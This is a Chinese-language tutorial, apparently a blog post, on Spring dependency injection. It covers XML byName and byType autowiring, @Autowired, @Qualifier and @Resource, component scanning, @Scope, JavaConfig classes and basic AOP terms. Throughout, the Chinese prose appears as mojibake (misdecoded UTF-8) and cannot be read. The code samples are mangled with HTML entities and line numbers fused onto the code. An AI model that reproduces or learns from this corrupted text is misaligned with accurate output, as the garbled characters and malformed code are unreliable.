Sessionæœ€ç»ˆè¢«åºŸå¼ƒçš„æ—¶å€™ï¼Œåœ¨è¯¥HTTP Sessionä½œç”¨åŸŸå†…çš„beanä¹Ÿä¼šè¢«åºŸå¼ƒæ‰ã€‚ Beançš„è‡ªåŠ¨è£…é… è‡ªåŠ¨è£…é…æ˜¯ä½¿ç”¨springæ»¡è¶³beanä¾èµ–çš„ä¸€ç§æ–¹æ³• springä¼šåœ¨åº”ç”¨ä¸Šä¸‹æ–‡ä¸­ä¸ºæŸä¸ªbeanå¯»æ‰¾å…¶ä¾èµ–çš„beanã€‚ Springä¸­beanæœ‰ä¸‰ç§è£…é…æœºåˆ¶ï¼Œåˆ†åˆ«æ˜¯ï¼š åœ¨xmlä¸­æ˜¾å¼é…ç½®ï¼› åœ¨javaä¸­æ˜¾å¼é…ç½®ï¼› éšå¼çš„beanå‘ç°æœºåˆ¶å’Œè‡ªåŠ¨è£…é…ã€‚ è¿™é‡Œæˆ‘ä»¬ä¸»è¦è®²ç¬¬ä¸‰ç§ï¼šè‡ªåŠ¨åŒ–çš„è£…é…beanã€‚ Springçš„è‡ªåŠ¨è£…é…éœ€è¦ä»ä¸¤ä¸ªè§’åº¦æ¥å®ç°ï¼Œæˆ–è€…è¯´æ˜¯ä¸¤ä¸ªæ“ä½œï¼š ç»„ä»¶æ‰«æ(component scanning)ï¼šspringä¼šè‡ªåŠ¨å‘ç°åº”ç”¨ä¸Šä¸‹æ–‡ä¸­æ‰€åˆ›å»ºçš„beanï¼› è‡ªåŠ¨è£…é…(autowiring)ï¼šspringè‡ªåŠ¨æ»¡è¶³beanä¹‹é—´çš„ä¾èµ–ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¯´çš„IoC&#x2F;DIï¼› ç»„ä»¶æ‰«æå’Œè‡ªåŠ¨è£…é…ç»„åˆå‘æŒ¥å·¨å¤§å¨åŠ›ï¼Œä½¿çš„æ˜¾ç¤ºçš„é…ç½®é™ä½åˆ°æœ€å°‘ã€‚ æµ‹è¯•ç¯å¢ƒæ­å»ºæ–°å»ºä¸¤ä¸ªå®ä½“ç±»ï¼ŒCat Dog éƒ½æœ‰ä¸€ä¸ªå«çš„æ–¹æ³• 12345public class Cat &#123; public void shout() &#123; System.out.println(&quot;miao~&quot;); &#125;&#125; 12345public class Dog &#123; public void shout() &#123; System.out.println(&quot;wang~&quot;); &#125;&#125; æ–°å»ºä¸€ä¸ªç”¨æˆ·ç±» User 12345public class User &#123; private Cat cat; private Dog dog; private String str;&#125; ç¼–å†™Springé…ç½®æ–‡ä»¶ 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;dog&quot; class=&quot;com.she11F.pojo.Dog&quot;/&gt; &lt;bean id=&quot;cat&quot; class=&quot;com.she11F.pojo.Cat&quot;/&gt; &lt;bean id=&quot;user&quot; class=&quot;com.she11F.pojo.User&quot;&gt; &lt;property name=&quot;cat&quot; ref=&quot;cat&quot;/&gt; &lt;property name=&quot;dog&quot; ref=&quot;dog&quot;/&gt; &lt;property name=&quot;str&quot; value=&quot;qinjiang&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; æ­£å¸¸çš„ xml æ³¨å…¥æˆ‘ä»¬å°±ä¸è®²äº†ï¼Œçœ‹çœ‹è‡ªåŠ¨åŒ–è£…é… byNameautowire byName (æŒ‰åç§°è‡ªåŠ¨è£…é…) 123&lt;!--byNameï¼šä¼šè‡ªåŠ¨åœ¨å®¹å™¨ä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾ï¼Œå’Œè‡ªå·±å¯¹è±¡setæ–¹æ³•åé¢çš„å€¼å¯¹åº”çš„bean idï¼ --&gt; ç”±äºåœ¨æ‰‹åŠ¨é…ç½®xmlè¿‡ç¨‹ä¸­ï¼Œå¸¸å¸¸å‘ç”Ÿå­—æ¯ç¼ºæ¼å’Œå¤§å°å†™ç­‰é”™è¯¯ï¼Œè€Œæ— æ³•å¯¹å…¶è¿›è¡Œæ£€æŸ¥ï¼Œä½¿å¾—å¼€å‘æ•ˆç‡é™ä½ã€‚ é‡‡ç”¨è‡ªåŠ¨è£…é…å°†é¿å…è¿™äº›é”™è¯¯ï¼Œå¹¶ä¸”ä½¿é…ç½®ç®€å•åŒ–ã€‚ æµ‹è¯•ï¼š ä¿®æ”¹beané…ç½®ï¼Œå¢åŠ ä¸€ä¸ªå±æ€§ autowire&#x3D;â€byNameâ€ 123&lt;bean id=&quot;user&quot; class=&quot;com.she11f.pojo.User&quot; autowire=&quot;byName&quot;&gt; &lt;property name=&quot;str&quot; value=&quot;she11f&quot;/&gt;&lt;/bean&gt; 1234567891011&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;dog&quot; class=&quot;com.she11F.pojo.Dog&quot;/&gt; &lt;bean id=&quot;cat&quot; class=&quot;com.she11F.pojo.Cat&quot;/&gt; &lt;bean id=&quot;user&quot; class=&quot;com.she11F.pojo.User&quot; autowire=&quot;byName&quot;&gt; &lt;property name=&quot;str&quot; value=&quot;she11f&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; å†æ¬¡æµ‹è¯•ï¼Œç»“æœä¾æ—§æˆåŠŸè¾“å‡ºï¼ æˆ‘ä»¬å°† cat çš„bean idä¿®æ”¹ä¸º catXXX å†æ¬¡æµ‹è¯•ï¼Œ æ‰§è¡Œæ—¶æŠ¥ç©ºæŒ‡é’ˆjava.lang.NullPointerExceptionã€‚å› ä¸ºæŒ‰byNameè§„åˆ™æ‰¾ä¸å¯¹åº”setæ–¹æ³•ï¼ŒçœŸæ­£çš„setCatå°±æ²¡æ‰§è¡Œï¼Œå¯¹è±¡å°±æ²¡æœ‰åˆå§‹åŒ–ï¼Œæ‰€ä»¥è°ƒç”¨æ—¶å°±ä¼šæŠ¥ç©ºæŒ‡é’ˆé”™è¯¯ã€‚ å°ç»“ï¼š å½“ä¸€ä¸ªbeanèŠ‚ç‚¹å¸¦æœ‰ autowire byNameçš„å±æ€§æ—¶ã€‚ å°†æŸ¥æ‰¾å…¶ç±»ä¸­æ‰€æœ‰çš„setæ–¹æ³•åï¼Œä¾‹å¦‚setCatï¼Œè·å¾—å°†setå»æ‰å¹¶ä¸”é¦–å­—æ¯å°å†™çš„å­—ç¬¦ä¸²ï¼Œå³catã€‚ å»springå®¹å™¨ä¸­å¯»æ‰¾æ˜¯å¦æœ‰æ­¤å­—ç¬¦ä¸²åç§°idçš„å¯¹è±¡ã€‚ å¦‚æœæœ‰ï¼Œå°±å–å‡ºæ³¨å…¥ï¼›å¦‚æœæ²¡æœ‰ï¼Œå°±æŠ¥ç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚ byTypeautowire byType (æŒ‰ç±»å‹è‡ªåŠ¨è£…é…) 123&lt;!--byTypeï¼šä¼šè‡ªåŠ¨åœ¨å®¹å™¨ä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾ï¼Œå’Œè‡ªå·±å¯¹è±¡å±æ€§ç±»å‹ç›¸åŒçš„beanï¼ --&gt; ä½¿ç”¨autowire byTypeé¦–å…ˆéœ€è¦ä¿è¯ï¼šåŒä¸€ç±»å‹çš„å¯¹è±¡ï¼Œåœ¨springå®¹å™¨ä¸­å”¯ä¸€ã€‚å¦‚æœä¸å”¯ä¸€ï¼Œä¼šæŠ¥ä¸å”¯ä¸€çš„å¼‚å¸¸ã€‚ 1NoUniqueBeanDefinitionException æµ‹è¯•ï¼š å°†userçš„beané…ç½®ä¿®æ”¹ä¸€ä¸‹ ï¼š autowire=&quot;byType&quot; æµ‹è¯•ï¼Œæ­£å¸¸è¾“å‡º å†æ³¨å†Œä¸€ä¸ªcat çš„beanå¯¹è±¡ï¼ æµ‹è¯•ï¼ŒæŠ¥é”™ï¼šNoUniqueBeanDefinitionException åˆ æ‰cat2ï¼Œå°†catçš„beanåç§°æ”¹æ‰ï¼æµ‹è¯•ï¼å› ä¸ºæ˜¯æŒ‰ç±»å‹è£…é…ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šæŠ¥å¼‚å¸¸ï¼Œä¹Ÿä¸å½±å“æœ€åçš„ç»“æœã€‚ç”šè‡³å°†idå±æ€§å»æ‰ï¼Œä¹Ÿä¸å½±å“ç»“æœã€‚ è¿™å°±æ˜¯æŒ‰ç…§ç±»å‹è‡ªåŠ¨è£…é…ï¼ ä½¿ç”¨æ³¨è§£dk1.5å¼€å§‹æ”¯æŒæ³¨è§£ï¼Œspring2.5å¼€å§‹å…¨é¢æ”¯æŒæ³¨è§£ã€‚ å‡†å¤‡å·¥ä½œï¼š åˆ©ç”¨æ³¨è§£çš„æ–¹å¼æ³¨å…¥å±æ€§ã€‚ åœ¨springé…ç½®æ–‡ä»¶ä¸­å¼•å…¥contextæ–‡ä»¶å¤´ 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;!--å¼€å¯æ³¨è§£çš„æ”¯æŒ --&gt; &lt;context:annotation-config/&gt;&lt;/beans&gt; @Autowired @Autowiredæ˜¯æŒ‰ç±»å‹è‡ªåŠ¨è½¬é…çš„ï¼Œä¸æ”¯æŒidåŒ¹é…ã€‚ éœ€è¦å¯¼å…¥ spring-aopçš„åŒ…ï¼ æµ‹è¯•ï¼š å°†Userç±»ä¸­çš„setæ–¹æ³•å»æ‰ï¼Œä½¿ç”¨@Autowiredæ³¨è§£ 12345678910111213141516public class User &#123; @Autowired private Cat cat; @Autowired private Dog dog; private String str; public Cat getCat() &#123; return cat; &#125; public Dog getDog() &#123; return dog; &#125; public String getStr() &#123; return str; &#125;&#125; @Autowired(required&#x3D;false) è¯´æ˜ï¼š falseï¼Œå¯¹è±¡å¯ä»¥ä¸ºnullï¼›trueï¼Œå¯¹è±¡å¿…é¡»å­˜å¯¹è±¡ï¼Œä¸èƒ½ä¸ºnullã€‚ 123//å¦‚æœå…è®¸å¯¹è±¡ä¸ºnullï¼Œè®¾ç½®required = false,é»˜è®¤ä¸ºtrue@Autowired(required = false)private Cat cat; @Qualifier @Autowiredæ˜¯æ ¹æ®ç±»å‹è‡ªåŠ¨è£…é…çš„ï¼ŒåŠ ä¸Š@Qualifieråˆ™å¯ä»¥æ ¹æ®byNameçš„æ–¹å¼è‡ªåŠ¨è£…é… @Qualifierä¸èƒ½å•ç‹¬ä½¿ç”¨ã€‚ å¦‚æœ@Autowiredè‡ªåŠ¨è£…é…çš„ç¯å¢ƒæ¯”è¾ƒå¤æ‚ï¼Œè‡ªåŠ¨è£…é…æ— æ³•é€šè¿‡ä¸€ä¸ªæ³¨è§£ã€@Autowiredã€‘å®Œæˆçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨@Qualifier(value &#x3D; â€œxxxâ€)å»é…ç½®@Autowiredçš„ä½¿ç”¨ï¼ŒæŒ‡å®šä¸€ä¸ªå”¯ä¸€çš„beanå¯¹è±¡æ³¨å…¥ï¼ æµ‹è¯•å®éªŒæ­¥éª¤ï¼š é…ç½®æ–‡ä»¶ä¿®æ”¹å†…å®¹ï¼Œä¿è¯ç±»å‹å­˜åœ¨å¯¹è±¡ã€‚ä¸”åå­—ä¸ä¸ºç±»çš„é»˜è®¤åå­—ï¼ 1234567&lt;bean id=&quot;dog1&quot; class=&quot;com.she11F.pojo.Dog&quot;/&gt;&lt;bean id=&quot;dog2&quot; class=&quot;com.she11F.pojo.Dog&quot;/&gt;&lt;bean id=&quot;cat1&quot; class=&quot;com.she11F.pojo.Cat&quot;/&gt;&lt;bean id=&quot;cat2&quot; class=&quot;com.she11F.pojo.Cat&quot;/&gt;&lt;bean id=&quot;user&quot; class=&quot;com.she11F.pojo.User&quot; &gt; &lt;property name=&quot;str&quot; value=&quot;she11f&quot;/&gt;&lt;/bean&gt; æ²¡æœ‰åŠ Qualifieræµ‹è¯•ï¼Œç›´æ¥æŠ¥é”™ åœ¨å±æ€§ä¸Šæ·»åŠ Qualifieræ³¨è§£ 123456@Autowired@Qualifier(value = &quot;cat2&quot;)private Cat cat;@Autowired@Qualifier(value = &quot;dog2&quot;)private Dog dog; @Resource @Resourceå¦‚æœ‰æŒ‡å®šçš„nameå±æ€§ï¼Œå…ˆæŒ‰è¯¥å±æ€§è¿›è¡ŒbyNameæ–¹å¼æŸ¥æ‰¾è£…é…ï¼› å…¶æ¬¡å†è¿›è¡Œé»˜è®¤çš„byNameæ–¹å¼è¿›è¡Œè£…é…ï¼› å¦‚æœä»¥ä¸Šéƒ½ä¸æˆåŠŸï¼Œåˆ™æŒ‰byTypeçš„æ–¹å¼è‡ªåŠ¨è£…é…ã€‚ éƒ½ä¸æˆåŠŸï¼Œåˆ™æŠ¥å¼‚å¸¸ã€‚ å®ä½“ç±»ï¼š 12345678public class User &#123; //å¦‚æœå…è®¸å¯¹è±¡ä¸ºnullï¼Œè®¾ç½®required = false,é»˜è®¤ä¸ºtrue @Resource(name = &quot;cat2&quot;) private Cat cat; @Resource private Dog dog; private String str;&#125; 1234&lt;bean id=&quot;dog&quot; class=&quot;com.kuang.pojo.Dog&quot;/&gt;&lt;bean id=&quot;cat1&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;&lt;bean id=&quot;cat2&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;&lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot;/&gt; æµ‹è¯•ï¼šç»“æœOK é…ç½®æ–‡ä»¶2ï¼šbeans.xml ï¼Œ åˆ æ‰cat2 12&lt;bean id=&quot;dog&quot; class=&quot;com.kuang.pojo.Dog&quot;/&gt;&lt;bean id=&quot;cat1&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt; å®ä½“ç±»ä¸Šåªä¿ç•™æ³¨è§£ 1234@Resourceprivate Cat cat;@Resourceprivate Dog dog; ç»“æœï¼šOK ç»“è®ºï¼šå…ˆè¿›è¡ŒbyNameæŸ¥æ‰¾ï¼Œå¤±è´¥ï¼›å†è¿›è¡ŒbyTypeæŸ¥æ‰¾ï¼ŒæˆåŠŸã€‚ @Autowiredä¸@Resourceå¼‚åŒï¼š @Autowiredä¸@Resourceéƒ½å¯ä»¥ç”¨æ¥è£…é…beanã€‚éƒ½å¯ä»¥å†™åœ¨å­—æ®µä¸Šï¼Œæˆ–å†™åœ¨setteræ–¹æ³•ä¸Šã€‚ @Autowiredé»˜è®¤æŒ‰ç±»å‹è£…é…ï¼ˆå±äºspringè§„èŒƒï¼‰ï¼Œé»˜è®¤æƒ…å†µä¸‹å¿…é¡»è¦æ±‚ä¾èµ–å¯¹è±¡å¿…é¡»å­˜åœ¨ï¼Œå¦‚æœè¦å…è®¸null å€¼ï¼Œå¯ä»¥è®¾ç½®å®ƒçš„requiredå±æ€§ä¸ºfalseï¼Œå¦‚ï¼š@Autowired(required&#x3D;false) ï¼Œå¦‚æœæˆ‘ä»¬æƒ³ä½¿ç”¨åç§°è£…é…å¯ä»¥ç»“åˆ@Qualifieræ³¨è§£è¿›è¡Œä½¿ç”¨ @Resourceï¼ˆå±äºJ2EEå¤è¿”ï¼‰ï¼Œé»˜è®¤æŒ‰ç…§åç§°è¿›è¡Œè£…é…ï¼Œåç§°å¯ä»¥é€šè¿‡nameå±æ€§è¿›è¡ŒæŒ‡å®šã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šnameå±æ€§ï¼Œå½“æ³¨è§£å†™åœ¨å­—æ®µä¸Šæ—¶ï¼Œé»˜è®¤å–å­—æ®µåè¿›è¡ŒæŒ‰ç…§åç§°æŸ¥æ‰¾ï¼Œå¦‚æœæ³¨è§£å†™åœ¨setteræ–¹æ³•ä¸Šé»˜è®¤å–å±æ€§åè¿›è¡Œè£…é…ã€‚ å½“æ‰¾ä¸åˆ°ä¸åç§°åŒ¹é…çš„beanæ—¶æ‰æŒ‰ç…§ç±»å‹è¿›è¡Œè£…é…ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœnameå±æ€§ä¸€æ—¦æŒ‡å®šï¼Œå°±åªä¼šæŒ‰ç…§åç§°è¿›è¡Œè£…é…ã€‚ å®ƒä»¬çš„ä½œç”¨ç›¸åŒéƒ½æ˜¯ç”¨æ³¨è§£æ–¹å¼æ³¨å…¥å¯¹è±¡ï¼Œä½†æ‰§è¡Œé¡ºåºä¸åŒã€‚@Autowiredå…ˆbyTypeï¼Œ@Resourceå…ˆbyNameã€‚ ä½¿ç”¨æ³¨è§£å¼€å‘åœ¨spring4ä¹‹åï¼Œæƒ³è¦ä½¿ç”¨æ³¨è§£å½¢å¼ï¼Œå¿…é¡»å¾—è¦å¼•å…¥aopçš„åŒ… ä½¿ç”¨æ³¨è§£éœ€è¦å¯¼å…¥çº¦æŸï¼Œé…ç½®æ³¨è§£çš„æ”¯æŒï¼ 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;&lt;/beans&gt; Beançš„å®ç°æˆ‘ä»¬ä¹‹å‰éƒ½æ˜¯ä½¿ç”¨ bean çš„æ ‡ç­¾è¿›è¡Œbeanæ³¨å…¥ï¼Œä½†æ˜¯å®é™…å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½ä¼šä½¿ç”¨æ³¨è§£ï¼ é…ç½®æ‰«æå“ªäº›åŒ…ä¸‹çš„æ³¨è§£ 12&lt;!--æŒ‡å®šæ³¨è§£æ‰«æåŒ…--&gt; &lt;context:component-scan base-package=&quot;com.she11F.pojo&quot;/&gt; åœ¨æŒ‡å®šåŒ…ä¸‹ç¼–å†™ç±»ï¼Œå¢åŠ æ³¨è§£ 12345@Component(&quot;user&quot;)// ç›¸å½“äºé…ç½®æ–‡ä»¶ä¸­ &lt;bean id=&quot;user&quot; class=&quot;å½“å‰æ³¨è§£çš„ç±»&quot;/&gt;public class User &#123; public String name = &quot;she11F&quot;;&#125; å±æ€§æ³¨å…¥ä½¿ç”¨æ³¨è§£æ³¨å…¥å±æ€§ å¯ä»¥ä¸ç”¨æä¾›setæ–¹æ³•ï¼Œç›´æ¥åœ¨ç›´æ¥åä¸Šæ·»åŠ @value(â€œå€¼â€) 1234567@Component(&quot;user&quot;)// ç›¸å½“äºé…ç½®æ–‡ä»¶ä¸­ &lt;bean id=&quot;user&quot; class=&quot;å½“å‰æ³¨è§£çš„ç±»&quot;/&gt;public class User &#123; @Value(&quot;she11F&quot;) // ç›¸å½“äºé…ç½®æ–‡ä»¶ä¸­ &lt;property name=&quot;name&quot; value=&quot;she11F&quot;/&gt; public String name;&#125; è¡ç”Ÿæ³¨è§£æˆ‘ä»¬è¿™äº›æ³¨è§£ï¼Œå°±æ˜¯æ›¿ä»£äº†åœ¨é…ç½®æ–‡ä»¶å½“ä¸­é…ç½®æ­¥éª¤è€Œå·²ï¼æ›´åŠ çš„æ–¹ä¾¿å¿«æ·ï¼ @Componentä¸‰ä¸ªè¡ç”Ÿæ³¨è§£ ä¸ºäº†æ›´å¥½çš„è¿›è¡Œåˆ†å±‚ï¼ŒSpringå¯ä»¥ä½¿ç”¨å…¶å®ƒä¸‰ä¸ªæ³¨è§£ï¼ŒåŠŸèƒ½ä¸€æ ·ï¼Œç›®å‰ä½¿ç”¨å“ªä¸€ä¸ªåŠŸèƒ½éƒ½ä¸€æ ·ã€‚ @Controllerï¼šwebå±‚ @Serviceï¼šserviceå±‚ @Repositoryï¼šdaoå±‚ å†™ä¸Šè¿™äº›æ³¨è§£ï¼Œå°±ç›¸å½“äºå°†è¿™ä¸ªç±»äº¤ç»™Springç®¡ç†è£…é…äº†ï¼ è‡ªåŠ¨è£…é…æ³¨è§£åœ¨Beançš„è‡ªåŠ¨è£…é…å·²ç»è®²è¿‡äº†ï¼Œå¯ä»¥å›é¡¾ï¼ ä½œç”¨åŸŸ@scope singletonï¼šé»˜è®¤çš„ï¼ŒSpringä¼šé‡‡ç”¨å•ä¾‹æ¨¡å¼åˆ›å»ºè¿™ä¸ªå¯¹è±¡ã€‚å…³é—­å·¥å‚ ï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½ä¼šé”€æ¯ã€‚ prototypeï¼šå¤šä¾‹æ¨¡å¼ã€‚å…³é—­å·¥å‚ ï¼Œæ‰€æœ‰çš„å¯¹è±¡ä¸ä¼šé”€æ¯ã€‚å†…éƒ¨çš„åƒåœ¾å›æ”¶æœºåˆ¶ä¼šå›æ”¶ 123456@Controller(&quot;user&quot;)@Scope(&quot;prototype&quot;)public class User &#123; @Value(&quot;she11F&quot;) public String name;&#125; XMLä¸æ³¨è§£æ¯”è¾ƒ XMLå¯ä»¥é€‚ç”¨ä»»ä½•åœºæ™¯ ï¼Œç»“æ„æ¸…æ™°ï¼Œç»´æŠ¤æ–¹ä¾¿ æ³¨è§£ä¸æ˜¯è‡ªå·±æä¾›çš„ç±»ä½¿ç”¨ä¸äº†ï¼Œå¼€å‘ç®€å•æ–¹ä¾¿ xmlä¸æ³¨è§£æ•´åˆå¼€å‘ ï¼šæ¨èæœ€ä½³å®è·µ xmlç®¡ç†Bean æ³¨è§£å®Œæˆå±æ€§æ³¨å…¥ ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œ å¯ä»¥ä¸ç”¨æ‰«æï¼Œæ‰«ææ˜¯ä¸ºäº†ç±»ä¸Šçš„æ³¨è§£ 1&lt;context:annotation-config/&gt; ä½œç”¨ï¼š è¿›è¡Œæ³¨è§£é©±åŠ¨æ³¨å†Œï¼Œä»è€Œä½¿æ³¨è§£ç”Ÿæ•ˆ ç”¨äºæ¿€æ´»é‚£äº›å·²ç»åœ¨springå®¹å™¨é‡Œæ³¨å†Œè¿‡çš„beanä¸Šé¢çš„æ³¨è§£ï¼Œä¹Ÿå°±æ˜¯æ˜¾ç¤ºçš„å‘Springæ³¨å†Œ å¦‚æœä¸æ‰«æåŒ…ï¼Œå°±éœ€è¦æ‰‹åŠ¨é…ç½®bean å¦‚æœä¸åŠ æ³¨è§£é©±åŠ¨ï¼Œåˆ™æ³¨å…¥çš„å€¼ä¸ºnullï¼ åŸºäº Java ç±»è¿›è¡Œé…ç½® SpringJavaConfig åŸæ¥æ˜¯ Spring çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œå®ƒé€šè¿‡ Java ç±»çš„æ–¹å¼æä¾› Bean çš„å®šä¹‰ä¿¡æ¯ï¼Œåœ¨ Spring4 çš„ç‰ˆæœ¬ï¼Œ JavaConfig å·²æ­£å¼æˆä¸º Spring4 çš„æ ¸å¿ƒåŠŸèƒ½ ã€‚ 12345@Component //å°†è¿™ä¸ªç±»æ ‡æ³¨ä¸ºSpringçš„ä¸€ä¸ªç»„ä»¶ï¼Œæ”¾åˆ°å®¹å™¨ä¸­ï¼public class User &#123; @Value(&quot;she11F&quot;) public String name;&#125; è¿™é‡Œ @Component è¿™ä¸ªæ³¨è§£çš„æ„æ€ï¼Œå°±æ˜¯è¯´æ˜è¿™ä¸ªç±»è¢«Springæ¥ç®¡äº†ï¼Œæ³¨å†Œåˆ°äº†å®¹å™¨ä¸­ æ–°å»ºä¸€ä¸ª config é…ç½®åŒ…ï¼Œç¼–å†™ä¸€ä¸ªMyConfigé…ç½®ç±» 1234567@Configuration //ä»£è¡¨è¿™æ˜¯ä¸€ä¸ªé…ç½®ç±»public class MyConfig &#123; @Bean //é€šè¿‡æ–¹æ³•æ³¨å†Œä¸€ä¸ªbeanï¼Œè¿™é‡Œçš„è¿”å›å€¼å°±Beançš„ç±»å‹ï¼Œæ–¹æ³•åå°±æ˜¯beançš„idï¼ public User user()&#123; return new User(); &#125;&#125; æµ‹è¯•ç±» 123ApplicationContext context = new AnnotationConfigApplicationContext(MyConfig.class); User user = (User) context.getBean(&quot;user&quot;); System.out.println(user.name); å¯¼å…¥å…¶ä»–é…ç½®å¦‚ä½•åšå‘¢ï¼Ÿ æˆ‘ä»¬å†ç¼–å†™ä¸€ä¸ªé…ç½®ç±»ï¼ 123@Configuration //ä»£è¡¨è¿™æ˜¯ä¸€ä¸ªé…ç½®ç±»public class MyConfig2 &#123;&#125; åœ¨ä¹‹å‰çš„é…ç½®ç±»ä¸­æˆ‘ä»¬æ¥é€‰æ‹©å¯¼å…¥è¿™ä¸ªé…ç½®ç±» 12345678@Configuration@Import(MyConfig2.class) //å¯¼å…¥åˆå¹¶å…¶ä»–é…ç½®ç±»ï¼Œç±»ä¼¼äºé…ç½®æ–‡ä»¶ä¸­çš„ inculde æ ‡ç­¾public class MyConfig &#123; @Bean public Dog dog()&#123; return new Dog(); &#125;&#125; å…³äºè¿™ç§Javaç±»çš„é…ç½®æ–¹å¼ï¼Œæˆ‘ä»¬åœ¨ä¹‹åçš„SpringBoot å’Œ SpringCloudä¸­è¿˜ä¼šå¤§é‡çœ‹åˆ°ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“è¿™äº›æ³¨è§£çš„ä½œç”¨å³å¯ï¼ AOPAOPï¼ˆAspect Oriented Programmingï¼‰æ„ä¸ºï¼šé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œé€šè¿‡é¢„ç¼–è¯‘æ–¹å¼å’Œè¿è¡ŒæœŸåŠ¨æ€ä»£ç†å®ç°ç¨‹åºåŠŸèƒ½çš„ç»Ÿä¸€ç»´æŠ¤çš„ä¸€ç§æŠ€æœ¯ã€‚AOPæ˜¯OOPçš„å»¶ç»­ï¼Œæ˜¯è½¯ä»¶å¼€å‘ä¸­çš„ä¸€ä¸ªçƒ­ç‚¹ï¼Œä¹Ÿæ˜¯Springæ¡†æ¶ä¸­çš„ä¸€ä¸ªé‡è¦å†…å®¹ï¼Œæ˜¯å‡½æ•°å¼ç¼–ç¨‹çš„ä¸€ç§è¡ç”ŸèŒƒå‹ã€‚åˆ©ç”¨AOPå¯ä»¥å¯¹ä¸šåŠ¡é€»è¾‘çš„å„ä¸ªéƒ¨åˆ†è¿›è¡Œéš”ç¦»ï¼Œä»è€Œä½¿å¾—ä¸šåŠ¡é€»è¾‘å„éƒ¨åˆ†ä¹‹é—´çš„è€¦åˆåº¦é™ä½ï¼Œæé«˜ç¨‹åºçš„å¯é‡ç”¨æ€§ï¼ŒåŒæ—¶æé«˜äº†å¼€å‘çš„æ•ˆç‡ã€‚ Aopåœ¨Springä¸­çš„ä½œç”¨&#x3D;&#x3D;æä¾›å£°æ˜å¼äº‹åŠ¡ï¼›å…è®¸ç”¨æˆ·è‡ªå®šä¹‰åˆ‡é¢&#x3D;&#x3D; æ¨ªåˆ‡å…³æ³¨ç‚¹ï¼šè·¨è¶Šåº”ç”¨ç¨‹åºå¤šä¸ªæ¨¡å—çš„æ–¹æ³•æˆ–åŠŸèƒ½ã€‚å³æ˜¯ï¼Œä¸æˆ‘ä»¬ä¸šåŠ¡é€»è¾‘æ— å…³çš„ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦å…³æ³¨çš„éƒ¨åˆ†ï¼Œå°±æ˜¯æ¨ªåˆ‡å…³æ³¨ç‚¹ã€‚å¦‚æ—¥å¿— , å®‰å…¨ , ç¼“å­˜ , äº‹åŠ¡ç­‰ç­‰ â€¦. åˆ‡é¢ï¼ˆASPECTï¼‰ï¼šæ¨ªåˆ‡å…³æ³¨ç‚¹ è¢«æ¨¡å—åŒ– çš„ç‰¹æ®Šå¯¹è±¡ã€‚å³ï¼Œå®ƒæ˜¯ä¸€ä¸ªç±»ã€‚ é€šçŸ¥ï¼ˆAdviceï¼‰ï¼šåˆ‡é¢å¿…é¡»è¦å®Œæˆçš„å·¥ä½œã€‚å³ï¼Œå®ƒæ˜¯ç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•ã€‚ ç›®æ ‡ï¼ˆTargetï¼‰ï¼šè¢«é€šçŸ¥å¯¹è±¡ã€‚ ä»£ç†ï¼ˆProxyï¼‰ï¼šå‘ç›®æ ‡å¯¹è±¡åº”ç”¨é€šçŸ¥ä¹‹ååˆ›å»ºçš„å¯¹è±¡ã€‚ åˆ‡å…¥ç‚¹ï¼ˆPointCutï¼‰ï¼šåˆ‡é¢é€šçŸ¥ æ‰§è¡Œçš„ â€œåœ°ç‚¹â€çš„å®šä¹‰ã€‚ è¿æ¥ç‚¹ï¼ˆJointPointï¼‰ï¼šä¸åˆ‡å…¥ç‚¹åŒ¹é…çš„æ‰§è¡Œç‚¹ã€‚ 